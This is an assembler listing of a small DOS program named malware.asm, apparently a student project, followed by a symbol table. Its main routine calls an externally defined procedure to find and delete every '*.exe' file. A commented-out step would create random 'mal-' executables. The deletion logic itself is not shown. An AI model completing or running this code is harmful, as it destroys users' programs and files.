Microsoft (R) Macro Assembler Version 6.15.8803		    12/06/19 09:13:26
malware.asm						     Page 1 - 1


				;This code deletes all exe files for now
				INCLUDE mal.inc
			      C .NOLIST
			      C 
			      C 
			      C 
			      C search_exe_files_and_delete PROTO, ptrDTA:PTR BYTE, ptrDEL:PTR BYTE
			      C 
			      C delete_file PROTO
			      C 
			      C generate_random_exe_files PROTO, RAND:BYTE, rand_file_size:BYTE, ptrRAND:PTR BYTE
			      C 
			      C create_file PROTO
			      C 
			      C close_file PROTO
			      C .LIST
			      C 

 0000				.data
					;Delete part
 0000  0080 [				DTA BYTE 128 DUP(0)		;Disk Transfer Address
        00
       ]
 0080 2A 2E 65 78 65 00			delete_files BYTE "*.exe",0		;* is wildcard for any number of characters, used by 4Eh(find first file) and 4Fh(find next file)
					;Random creator part
 0086 6D 61 6C 2D			random_file BYTE "mal-",3 DUP(?), ".exe",0
       0003 [
        00
       ] 2E 65 78 65 00
 0092 = 000C				random_file_size = ($-random_file)
					
 0000				.code

 0000					main PROC
						
 0000  B8 ---- R				mov ax, @data
 0003  8E D8					mov ds, ax
					
						INVOKE clrscr
					
						INVOKE search_exe_files_and_delete, ADDR DTA, ADDR delete_files
						
						;INVOKE generate_random_exe_files, random_file, random_file_size, ADDR random_file
					
						exit
 0015					main ENDP
					;---------------------------------------------------------------------------------------------------
					;search_and_delete_exe PROC
					;------------------------------------------------------
					;delete_file PROC
					;----------------------------------------------------------------------------------------------------
					;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;Functions for random part
					;----------------------------------------------------------------------------------------------------
					;generate_random_exe_files PROC
					;--------------------------------------------------------------------------------------------------
					;create_file PROC
					;--------------------------------------------------------------------------------------------------
					;close_file PROC
				END main
Microsoft (R) Macro Assembler Version 6.15.8803		    12/06/19 09:13:26
malware.asm						     Symbols 2 - 1




Macros:

                N a m e                 Type

startup  . . . . . . . . . . . .	Proc


Structures and Unions:

                N a m e                  Size
                                         Offset      Type

ExtGetDskFreSpcStruc . . . . . .	 002C
  StructSize . . . . . . . . . .	 0000	     Word
  Level  . . . . . . . . . . . .	 0002	     Word
  SectorsPerCluster  . . . . . .	 0004	     DWord
  BytesPerSector . . . . . . . .	 0008	     DWord
  AvailableClusters  . . . . . .	 000C	     DWord
  TotalClusters  . . . . . . . .	 0010	     DWord
  AvailablePhysSectors . . . . .	 0014	     DWord
  TotalPhysSectors . . . . . . .	 0018	     DWord
  AvailableAllocationUnits . . .	 001C	     DWord
  TotalAllocationUnits . . . . .	 0020	     DWord
  Rsvd . . . . . . . . . . . . .	 0024	     DWord
TimeRecord . . . . . . . . . . .	 0004
  hours  . . . . . . . . . . . .	 0000	     Byte
  minutes  . . . . . . . . . . .	 0001	     Byte
  seconds  . . . . . . . . . . .	 0002	     Byte
  hhss . . . . . . . . . . . . .	 0003	     Byte


Segments and Groups:

                N a m e                 Size     Length   Align   Combine Class

DGROUP . . . . . . . . . . . . .	GROUP
_DATA  . . . . . . . . . . . . .	16 Bit	 0092	  Word	  Public  'DATA'	
STACK  . . . . . . . . . . . . .	16 Bit	 1000	  Para	  Stack	  'STACK'	 
_TEXT  . . . . . . . . . . . . .	16 Bit	 0015	  Word	  Public  'CODE'	


Procedures,  parameters and locals:

                N a m e                 Type     Value    Attr

ClrScr . . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Crlf . . . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Delay  . . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
DumpMem  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
DumpRegs . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Get_Commandtail  . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Get_Time . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Gotoxy . . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
IsDigit  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Random32 . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
RandomRange  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Randomize  . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
ReadChar . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
ReadHex  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
ReadInt  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
ReadString . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_compare  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_copy . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_length . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_trim . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
Str_ucase  . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WaitMsg  . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteBin . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteChar  . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteDec . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteHex . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteInt . . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
WriteString  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
close_file . . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
create_file  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
delete_file  . . . . . . . . . .	P Near	 0000	  Length= 0000 External STDCALL
generate_random_exe_files  . . .	P Near	 0000	  Length= 0000 External STDCALL
main . . . . . . . . . . . . . .	P Near	 0000	  _TEXT	Length= 0015 Public STDCALL
search_exe_files_and_delete  . .	P Near	 0000	  Length= 0000 External STDCALL


Symbols:

                N a m e                 Type     Value    Attr

@CodeSize  . . . . . . . . . . .	Number	 0000h	 
@DataSize  . . . . . . . . . . .	Number	 0000h	 
@Interface . . . . . . . . . . .	Number	 0003h	 
@Model . . . . . . . . . . . . .	Number	 0002h	 
@cmdline . . . . . . . . . . . .	Text   	 OFFSET __98765765cmdline
@code  . . . . . . . . . . . . .	Text   	 _TEXT
@data  . . . . . . . . . . . . .	Text   	 DGROUP
@fardata?  . . . . . . . . . . .	Text   	 FAR_BSS
@fardata . . . . . . . . . . . .	Text   	 FAR_DATA
@stack . . . . . . . . . . . . .	Text   	 DGROUP
DTA  . . . . . . . . . . . . . .	Byte	 0000	  _DATA	
black  . . . . . . . . . . . . .	Number	 0000h	 
blue . . . . . . . . . . . . . .	Number	 0001h	 
brown  . . . . . . . . . . . . .	Number	 0006h	 
cyan . . . . . . . . . . . . . .	Number	 0003h	 
delete_files . . . . . . . . . .	Byte	 0080	  _DATA	
exit . . . . . . . . . . . . . .	Text   	 .EXIT
gray . . . . . . . . . . . . . .	Number	 0008h	 
green  . . . . . . . . . . . . .	Number	 0002h	 
lightBlue  . . . . . . . . . . .	Number	 0009h	 
lightCyan  . . . . . . . . . . .	Number	 000Bh	 
lightGray  . . . . . . . . . . .	Number	 0007h	 
lightGreen . . . . . . . . . . .	Number	 000Ah	 
lightMagenta . . . . . . . . . .	Number	 000Dh	 
lightRed . . . . . . . . . . . .	Number	 000Ch	 
magenta  . . . . . . . . . . . .	Number	 0005h	 
random_file_size . . . . . . . .	Number	 000Ch	 
random_file  . . . . . . . . . .	Byte	 0086	  _DATA	
red  . . . . . . . . . . . . . .	Number	 0004h	 
white  . . . . . . . . . . . . .	Number	 000Fh	 
yellow . . . . . . . . . . . . .	Number	 000Eh	 

	   0 Warnings
	   0 Errors
